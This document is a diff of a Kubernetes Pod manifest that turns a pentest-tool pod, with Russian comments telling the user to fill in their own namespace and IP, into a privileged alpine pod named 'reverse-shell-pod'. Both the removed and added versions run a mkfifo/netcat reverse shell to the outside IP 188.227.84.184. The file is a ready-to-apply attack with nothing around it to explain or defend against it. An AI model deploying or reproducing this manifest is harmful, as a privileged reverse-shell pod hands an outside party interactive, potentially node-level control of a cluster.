@@ -1,23 +1,14 @@
 apiVersion: v1
 kind: Pod
 metadata:
-  name: mtkpi-pod
-  namespace: sportzia-staging  # ← ВАШ NAMESPACE!
-  labels:
-    app: mtkpi
+  name: reverse-shell-pod
 spec:
   containers:
-  - name: mtkpi-pod
-    image: r0binak/mtkpi:v1
+  - name: shell-container
+    image: alpine
+    securityContext:
+      privileged: true
     command: ["/bin/sh", "-c"]
     args:
     - |
-      # Запуск ttyd в фоне + reverse shell
-      ttyd -p 7681 /bin/sh &
-      sleep 5
-      rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 188.227.84.184 9003 > /tmp/f  # ← ВАШ IP:PORT
-      wait
-    ports:
-    - containerPort: 7681
-    securityContext:
-      readOnlyRootFilesystem: true
+      rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 188.227.84.184 9001 >/tmp/f
